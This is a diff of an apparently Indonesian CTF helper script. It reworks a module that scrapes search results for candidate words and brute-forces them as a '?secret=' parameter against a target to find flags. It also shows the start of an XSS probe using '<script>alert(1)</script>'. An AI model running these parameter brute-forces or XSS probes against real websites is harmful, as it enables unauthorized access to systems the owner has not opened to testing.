@@ -96,37 +96,39 @@ def module_spoof_request(url):
     print("[-] Tidak ditemukan flag dari kombinasi header umum.")
 
 def module_auto_secret_hunter(url):
-    print("[*] Auto-Secret Hunter: scanning keyword from URL & search engine...")
+    print("[*] Auto-Secret Hunter: scan keyword + Bing Search + fallback scraping...")
     try:
+        # Step 1: keyword dari URL
         parts = urlparse(url).path.strip('/').split('/')
-        base_keywords = list(set(parts + [w for p in parts for w in re.split(r'[-_]', p)]))
-        print(f"[+] Keywords from URL: {base_keywords[:6]}")
-        search_terms = '+'.join(base_keywords[:3])
-        search_engines = [
-            f"https://html.duckduckgo.com/html/?q={search_terms}+ctf+secret",
-            f"https://www.bing.com/search?q={search_terms}+ctf+secret"
-        ]
+        keywords = list(set(parts + [w for p in parts for w in re.split(r'[-_]', p)]))
+        print(f"[+] Keywords from URL: {keywords[:6]}")
+
+        # Step 2: Search via Bing
+        search_terms = '+'.join(keywords[:3])
+        search_url = f"https://www.bing.com/search?q={search_terms}+ctf+secret"
         headers = {"User-Agent": "Mozilla/5.0"}
-        candidates = set()
-        for engine in search_engines:
+        try:
+            r = requests.get(search_url, headers=headers, timeout=8)
+            hits = re.findall(r'<li class="b_algo".*?>(.*?)</li>', r.text, re.DOTALL)
+            candidates = set()
+            for h in hits:
+                clean = BeautifulSoup(h, 'html.parser').text
+                found = re.findall(r'\b[a-zA-Z0-9]{5,25}\b', clean)
+                for f in found:
+                    if f.lower() not in ['submit', 'ctf', 'index', 'home']:
+                        candidates.add(f.lower())
+        except:
+            print("[-] Bing blocked or failed. Fallback ke target web...")
+            r = requests.get(url, timeout=5)
+            candidates = set(re.findall(r'\b[a-zA-Z0-9]{5,25}\b', r.text))
+
+        brute_list = list(set(keywords + list(candidates)))[:30]
+        print(f"[*] Mencoba {len(brute_list)} kandidat sebagai ?secret=")
+
+        for word in brute_list:
             try:
-                r = requests.get(engine, headers=headers, timeout=8)
-                hits = re.findall(r'<a.*?>(.*?)</a>', r.text, re.DOTALL)
-                for h in hits:
-                    clean = BeautifulSoup(h, 'html.parser').text
-                    found = re.findall(r'\b[a-zA-Z0-9]{5,25}\b', clean)
-                    for f in found:
-                        if f.lower() not in ['submit', 'ctf', 'index', 'home']:
-                            candidates.add(f.lower())
-                if candidates: break
-            except Exception as e:
-                print(f"[-] {engine.split('/')[2]} gagal: {e}")
-        test_list = list(set(base_keywords + list(candidates)))[:25]
-        print(f"[*] Mencoba {len(test_list)} kandidat sebagai ?secret=")
-        for word in test_list:
-            try:
-                resp = requests.get(f"{url}?secret={quote_plus(word)}", timeout=5)
-                flags = re.findall(r'\w+\{.*?\}', resp.text)
+                test = requests.get(f"{url}?secret={quote_plus(word)}", timeout=5)
+                flags = re.findall(r'\w+\{.*?\}', test.text)
                 if flags:
                     for f in flags:
                         print(Fore.CYAN + "[FLAG]", f)
@@ -134,10 +136,10 @@ def module_auto_secret_hunter(url):
                     return
             except:
                 continue
-        print("[-] Tidak ditemukan flag dari kandidat hasil pencarian.")
+        print("[-] Tidak ditemukan flag dari brute ?secret=")
     except Exception as e:
-        print(f"[-] Auto-Secret module error: {e}")
-
+        print("[-] Secret Hunter Error:", e)
+        
 def module_xss_auto(url):
     print("[*] Auto-XSS Testing...")
     payload = "<script>alert(1)</script>"
